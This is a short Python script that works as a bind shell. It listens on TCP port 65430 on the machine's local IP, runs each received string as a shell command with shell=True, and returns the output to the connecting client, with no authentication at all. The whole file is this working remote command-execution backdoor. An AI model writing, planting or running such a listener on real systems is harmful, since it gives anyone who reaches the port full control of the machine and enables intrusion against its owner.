#!/usr/bin/env python3

import socket
import subprocess

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

host = local_ip
print(host)
port = 65430

def options(command):
    msg = "Command output:\n"
    msg += subprocess.check_output(command, shell=True, universal_newlines=True)
    print(msg)
    return msg

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((host, port))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            msg = data.decode()
            output = options(msg)
            if(msg == "exit"):
                break
            conn.sendall(str.encode(output))